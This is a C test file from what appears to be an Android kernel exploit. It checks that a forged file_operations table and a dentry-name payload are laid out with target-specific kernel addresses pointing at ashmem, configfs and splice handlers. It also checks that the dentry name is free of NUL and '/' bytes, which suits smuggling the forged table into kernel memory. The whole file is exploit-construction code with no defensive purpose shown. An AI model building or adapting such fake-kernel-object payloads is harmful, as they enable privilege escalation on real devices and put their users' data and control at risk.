#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "fops_install.h"
#include "target_zzhl.h"

static uint64_t read64(const unsigned char *buf, size_t off) {
  uint64_t value;
  memcpy(&value, buf + off, sizeof(value));
  return value;
}

static int expect(const char *name, uint64_t got, uint64_t want) {
  if (got == want) return 1;
  fprintf(stderr, "%s got=%016llx want=%016llx\n", name,
          (unsigned long long)got, (unsigned long long)want);
  return 0;
}

int main(void) {
  const uint64_t base = ZZHL_KIMAGE_TEXT_BASE;
  const uint64_t aligned = 0xffffff8000128000ULL;
  const size_t table = 0x2000;
  unsigned char scratch[FOPS_INSTALL_PAGE_SIZE];
  build_fops_install_object(scratch, aligned, base,
                            base + ZZHL_ASHMEM_MISC_FOPS_OFF,
                            base + ZZHL_INIT_TASK_OFF);
  int ok = 1;
  ok &= expect("owner", read64(scratch, table + 0x00), 0);
  ok &= expect("read_iter", read64(scratch, table + 0x20),
               base + ZZHL_CONFIGFS_READ_ITER_OFF);
  ok &= expect("write_iter", read64(scratch, table + 0x28),
               base + ZZHL_CONFIGFS_BIN_WRITE_ITER_OFF);
  ok &= expect("ioctl", read64(scratch, table + 0x50),
               base + ZZHL_ASHMEM_IOCTL_OFF);
  ok &= expect("compat_ioctl", read64(scratch, table + 0x58),
               base + ZZHL_ASHMEM_COMPAT_IOCTL_OFF);
  ok &= expect("mmap", read64(scratch, table + 0x60),
               base + ZZHL_ASHMEM_MMAP_OFF);
  ok &= expect("open", read64(scratch, table + 0x70),
               base + ZZHL_ASHMEM_OPEN_OFF);
  ok &= expect("release", read64(scratch, table + 0x80),
               base + ZZHL_ASHMEM_RELEASE_OFF);
  ok &= expect("splice_read", read64(scratch, table + 0xc8),
               base + ZZHL_COPY_SPLICE_READ_OFF);
  ok &= expect("show_fdinfo", read64(scratch, table + 0xe0),
               base + ZZHL_ASHMEM_SHOW_FDINFO_OFF);
  unsigned char name[DENTRY_FOPS_NAME_SIZE];
  ok &= build_reclaimable_dentry_fops_name(name, base);
  for (size_t i = 0; i < sizeof(name); i++) ok &= name[i] != 0 && name[i] != '/';
  ok &= expect("dentry.llseek", read64(name, 0x00),
               base + ZZHL_NOOP_LLSEEK_OFF);
  ok &= expect("dentry.release", read64(name, 0x78),
               base + ZZHL_ASHMEM_RELEASE_OFF);
  if (ok) puts("fops-layout=ok");
  return ok ? 0 : 1;
}
